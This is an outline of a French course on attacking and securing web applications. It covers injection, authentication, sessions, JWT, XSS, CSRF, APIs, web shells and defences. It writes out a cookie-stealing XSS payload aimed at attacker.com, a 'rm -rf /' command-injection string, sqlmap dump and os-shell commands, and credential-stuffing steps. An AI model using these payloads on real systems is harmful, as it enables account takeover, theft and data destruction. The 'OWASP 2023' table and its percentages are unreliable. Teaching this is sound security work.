1. Concepts des applications web

Architecture moderne

  1. Client: Navigateur, applications mobiles
  2. Serveur Web: Nginx, Apache, IIS
  3. Backend: Node.js, Django, Spring Boot
  4. Base de données: SQL, NoSQL, In-Memory
  5. Services externes: API, microservices

Technologies clés

Couche Technologies
Frontend React, Angular, Vue.js, HTML5, CSS3
Backend PHP, Python, Java, Ruby, .NET
Protocoles HTTP/HTTPS, WebSocket, REST, GraphQL
Stockage Cookies, Session Storage, Local Storage

Statistiques de sécurité

  • 85% des violations exploitent des vulnérabilités web
  • 43% des apps web ont des vulnérabilités critiques
  • Top 3 des vulnérabilités: Injection, XSS, Broken Auth
  • Coût moyen d'une violation: $4.35 millions

Cycle de vie d'une requête

  1. Requête HTTP du client
  2. Routage par le serveur web
  3. Traitement par l'application
  4. Interaction avec la base de données
  5. Génération de la réponse
  6. Envoi au client
  7. Rendu dans le navigateur

Concepts de sécurité

  • Same-Origin Policy (SOP)
  • Cross-Origin Resource Sharing (CORS)
  • Content Security Policy (CSP)
  • HTTP Strict Transport Security (HSTS)

2. Menaces des applications web

Top 10 OWASP 2023

Rang Vulnérabilité Fréquence
1 Injection 94%
2 Broken Authentication 88%
3 Sensitive Data Exposure 85%
4 XML External Entities (XXE) 82%
5 Broken Access Control 79%

Impact des menaces

  • Vol de données sensibles
  • Prise de contrôle de comptes
  • Défacement de sites
  • Installation de malware
  • Attaques sur les clients

Types d'attaquants

  • Script Kiddies: Débutants utilisant des outils existants
  • Hacktivistes: Motivés par des causes politiques
  • Cybercriminels: Recherche de profit financier
  • Insiders: Employés malveillants
  • APT: Groupes sponsorisés par des États

Vecteurs d'attaque courants

  • Formulaires web non sécurisés
  • APIs exposées sans authentification
  • Configurations par défaut
  • Composants vulnérables (librairies)
  • Erreurs de validation des entrées

3. Méthodologie de hacking

Processus d'attaque

  1. Reconnaissance: Collecte d'informations
  2. Scanning: Identification des vulnérabilités
  3. Énumération: Découverte des ressources
  4. Exploitation: Abus des vulnérabilités
  5. Escalade de privilèges: Obtention d'accès
  6. Maintien de l'accès: Backdoors, webshells
  7. Effacement des traces: Suppression des logs

Outils essentiels

  • Reconnaissance: Whois, nslookup, theHarvester
  • Scanning: Nmap, Nikto, OWASP ZAP
  • Exploitation: Burp Suite, sqlmap, Metasploit
  • Post-exploitation: Webshells, mimikatz

Cadres méthodologiques

  • OWASP Testing Guide: Standard pour les tests d'applications web
  • PTES: Penetration Testing Execution Standard
  • NIST SP 800-115: Guide pour les tests de sécurité
  • OSSTMM: Méthodologie open source

Éthique et légalité

  • Autorisation écrite obligatoire
  • Respect du scope défini
  • Minimisation des impacts
  • Documentation complète
  • Rapport détaillé des vulnérabilités

Étapes d'analyse

  2. Analyse des fonctionnalités
  3. Identification des points d'entrée
  4. Analyse des mécanismes de sécurité

Techniques d'analyse

  • Décompilation des binaires

Outils d'analyse

  • Postman: Test d'APIs

Points d'entrée critiques

  • Formulaires de login
  • Champs de recherche
  • Upload de fichiers
  • Paramètres d'URL
  • Cookies d'authentification

6. Contournement des contrôles client

Types de contrôles client

Contrôle Méthode de contournement
Validation JavaScript Désactivation JS, modification du code
Champs cachés Modification des valeurs
CAPTCHA OCR, résolution par API, contournement logique
Contrôles d'intégrité Modification des hashs/checksums

Exemple: Contournement de validation

Validation côté client: if (price > 0) {...}

Contournement: Modifier la requête HTTP pour envoyer price=-10

Outils de contournement

  • Burp Suite: Interception et modification des requêtes
  • Browser DevTools: Modification en temps réel
  • curl: Envoi de requêtes personnalisées
  • Postman: Test d'APIs avec paramètres modifiés

Démonstration: Contournement CAPTCHA

  1. Identifier le CAPTCHA comme élément client
  2. Envoyer une valeur statique au lieu du CAPTCHA
  3. Réutiliser un token CAPTCHA valide
  4. Utiliser un service de résolution automatique

7. Attaque des mécanismes d'authentification

Vecteurs d'attaque

Attaque Description
Brute Force Essais de mots de passe en masse
Credential Stuffing Réutilisation de credentials volés
Password Spraying Essai de mots de passe courants sur plusieurs comptes
Session Hijacking Vol de tokens de session
Faiblesses courantes
  • Mots de passe faibles ou par défaut
  • Absence de verrouillage de compte
  • Réinitialisation de mot de passe non sécurisée
  • Stockage non sécurisé des credentials

Outils d'attaque

  • Hydra: Brute force réseau
  • Burp Intruder: Attaques personnalisées
  • John the Ripper: Crackage de mots de passe
  • Hashcat: Crackage accéléré par GPU

Attaque par credential stuffing

  1. Obtenir des listes de credentials (fuites de données)
  2. Nettoyer et formater les données
  3. Utiliser un outil comme Sentry MBA ou SNIPR
  4. Tester les combinaisons sur la cible
  5. Exploiter les comptes compromis

8. Attaque des schémas d'autorisation

Problèmes courants

  • IDOR (Insecure Direct Object Reference)
  • Contournement des contrôles d'accès
  • Élévation de privilèges
  • Défauts dans les contrôles RBAC/ABAC
  • JWT mal configurés

IDOR Examples

URL vulnérable: https://example.com/profile?user_id=123

Attaque: Changer user_id=124 pour accéder à un autre profil

Techniques d'attaque

  • Manipulation des paramètres
  • Modification des méthodes HTTP
  • Ajout de headers personnalisés
  • Exploitation des tokens JWT
  • Abus des fonctionnalités d'API

Attaque JWT

  1. Récupérer un token JWT
  2. Décoder le token sur jwt.io
  3. Modifier les claims (ex: role:admin)
  4. Signer avec l'algorithme "none"
  5. Renvoyer le token modifié

9. Attaque de la gestion de session

Vulnérabilités courantes

Vulnérabilité Impact
Session Fixation Prise de contrôle de session
Session Timeout Absent Session perpétuelle
Cookies non sécurisés Vol via MITM ou XSS
Prédiction d'ID de session Génération de sessions valides
Attaque par fixation de session
  1. Attaquant crée une session valide
  2. Force la victime à utiliser cette session
  3. Victime s'authentifie avec cette session
  4. Attaquant accède au compte authentifié

Outils d'attaque

  • Burp Suite: Manipulation de cookies
  • OWASP ZAP: Analyse de session
  • Cookie-Editor: Extension navigateur
  • Web Developer Tools: Visualisation des cookies

Bonnes pratiques de session

  • Utilisation de tokens aléatoires longs
  • Renouvellement après authentification
  • Cookies Secure, HttpOnly, SameSite
  • Timeout automatique
  • Invalidation côté serveur

10. Attaques par injection

Types d'injection

Type Exemple
SQL Injection ' OR 1=1--
Command Injection ; rm -rf /
LDAP Injection *)(objectClass=*))
XPath Injection ' or 1=1 or 'a'='a
Template Injection {{7*7}} = 49

Impact des injections

  • Accès non autorisé aux données
  • Exécution de commandes système
  • Compromission du serveur
  • Déni de service
  • Prise de contrôle complète

Outils d'injection

  • sqlmap: Détection et exploitation SQLi
  • Commix: Exploitation de command injection
  • NoSQLMap: Injection NoSQL
  • XSStrike: Détection avancée XSS

Démonstration SQLi avec sqlmap

sqlmap -u "http://example.com?id=1" --dbs
sqlmap -u "http://example.com?id=1" -D dbname --tables
sqlmap -u "http://example.com?id=1" -D dbname -T users --dump
sqlmap -u "http://example.com?id=1" --os-shell

11. Failles logiques applicatives

Exemples de failles logiques

  • Contournement des étapes de processus
  • Logique métier défectueuse
  • Problèmes de séquence temporelle
  • Incohérences dans les flux de travail
  • Erreurs dans les calculs financiers

Exemple: Contournement de paiement

  1. Ajouter des articles au panier
  2. Passer à l'étape de paiement
  3. Modifier le prix total dans la requête
  4. Confirmer la commande avec le prix modifié

Détection des failles logiques

  • Analyse approfondie des flux métier
  • Test des cas limites
  • Modification des paramètres cachés
  • Changement de l'ordre des étapes
  • Test des incohérences métier

Outils d'analyse

  • Burp Suite (Repeater, Sequencer)
  • OWASP ZAP
  • Postman pour les scénarios complexes
  • Outils de scripting personnalisés

12. Environnements partagés

Risques des environnements partagés

Environnement Vulnérabilités
Hébergement mutualisé Cross-site contamination
Conteneurs Docker Évasion de conteneur
VM partagées Hypervisor escape
Serverless Injection de fonctions
Attaque: Cross-site contamination
  1. Identifier un site vulnérable sur le même serveur
  2. Exploiter une vulnérabilité LFI/RFI
  3. Accéder aux fichiers d'autres sites
  4. Compromettre le serveur via un site faible

Contre-mesures

  • Isolation stricte des environnements
  • Renforcement des configurations
  • Mise à jour régulière des composants
  • Surveillance des accès inter-applications
  • Utilisation de sandboxing

Évasion de conteneur Docker

  1. Obtenir un accès dans un conteneur
  2. Identifier les montages sensibles
  3. Exploiter les capabilities excessives
  4. Accéder au socket Docker
  5. Exécuter des commandes sur l'hôte

13. Attaque de la connectivité DB

Vecteurs d'attaque

  • Injection SQL/NoSQL
  • Accès direct non authentifié
  • Credentials par défaut ou faibles
  • Exploitation des procédures stockées
  • Attaques sur les connexions chiffrées

Exemple: Attaque NoSQL

Requête MongoDB: db.users.find({user: "admin", password: "password"})

Attaque: { "user": "admin", "password": {"$ne": ""} }

Outils d'attaque DB

  • sqlmap: Injection SQL avancée
  • NoSQLMap: Exploitation NoSQL
  • Adminer: Interface web pour gestion DB
  • Metasploit: Modules d'exploitation DB

Post-exploitation DB

  • Extraction de données sensibles
  • Élévation de privilèges via DB
  • Exécution de commandes système
  • Pivotage vers d'autres systèmes
  • Installation de backdoors persistantes

14. Attaque du client web

Vulnérabilités côté client

Vulnérabilité Impact
Cross-Site Scripting (XSS) Vol de session, défacement
Cross-Site Request Forgery (CSRF) Actions non autorisées
Clickjacking Interaction utilisateur trompée
DOM-based Vulnerabilities Exécution de code malveillant
Exemple: XSS Stored
<script>fetch('https://attacker.com?cookie='+document.cookie)</script>

Injecté dans un champ de commentaire, vole les cookies des visiteurs

Outils d'attaque client

  • BeEF: Framework d'exploitation browser
  • XSStrike: Détection avancée XSS
  • CSRF PoC Generator: Génération de preuves concept
  • Browser Exploitation Framework: Exploits navigateur

Attaque CSRF

  1. Identifier une action sensible (ex: transfert d'argent)
  2. Créer un formulaire malveillant reproduisant la requête
  3. Inciter la victime à visiter la page
  4. L'action est exécutée avec les droits de la victime

15. Attaque des services web

Types de services web

  • SOAP: Protocole XML basé sur WSDL
  • REST: Architecture basée sur HTTP
  • GraphQL: Langage de requête moderne
  • gRPC: Appels de procédure à distance

Vulnérabilités communes

  • Authentification/authorization défectueuse
  • Manque de validation des entrées
  • Exposition de données excessive
  • Déni de service
  • Configurations incorrectes

Outils de test API

  • Postman: Test manuel et automation
  • OWASP ZAP: Scanner API
  • Burp Suite: Proxy et scanner API
  • SoapUI: Test de services SOAP
  • GraphQL Voyager: Inspection GraphQL

Attaque GraphQL

  1. Découverte des schémas via introspection
  2. Analyse des requêtes et mutations
  3. Essai de requêtes profondes (DoS)
  4. Injection dans les arguments
  5. Contournement d'autorisation

16. Web API, Webhooks et Web Shell

Concepts modernes

  • Web API: Interface de programmation pour applications
  • Webhooks: Notifications événementielles
  • Web Shell: Script malveillant pour accès distant
  • Serverless Functions: Exécution de code sans serveur dédié

Attaque de webhooks

  1. Intercepter une requête de webhook
  2. Modifier la payload ou l'URL de callback
  3. Forger des événements malveillants
  4. Exploiter les SSRF via les webhooks

Web Shells

  • Types: PHP, ASP, JSP, Python
  • Méthodes d'installation: Upload, injection, backdoor
  • Fonctionnalités: Exécution de commandes, navigation fichiers
  • Outils: Weevely, C99, b374k

Détection et prévention

  • Analyur de signatures de fichiers
  • Surveillance du comportement
  • Restriction des fonctions dangereuses
  • Validation des uploads de fichiers
  • Scanning régulier du système de fichiers

17. Sécurité des applications web

Bonnes pratiques de développement

  • Validation stricte des entrées
  • Encodage des sorties
  • Authentification forte (MFA)
  • Gestion sécurisée des sessions
  • Contrôle d'accès basé sur les rôles
  • Journalisation et monitoring

Sécurité dans le cycle de vie

  • Revue de code sécurisée
  • Tests automatisés de sécurité (SAST, DAST)
  • Analyse des dépendances (SCA)
  • Tests d'intrusion réguliers
  • Formation des développeurs

Outils de défense

  • WAF: ModSecurity, Cloudflare
  • RASP: Protection runtime
  • SAST: SonarQube, Checkmarx
  • DAST: OWASP ZAP, Burp Suite Pro
  • SCA: Snyk, Dependency-Check

Cadres de sécurité

  • OWASP Application Security Verification Standard
  • NIST Cybersecurity Framework
  • ISO/IEC 27034
  • PCI DSS pour les applications de paiement

Programme de sécurité complet

  1. Évaluation des risques
  2. Définition des politiques
  3. Formation des équipes
  4. Implémentation des contrôles
  5. Surveillance continue
  6. Amélioration itérative
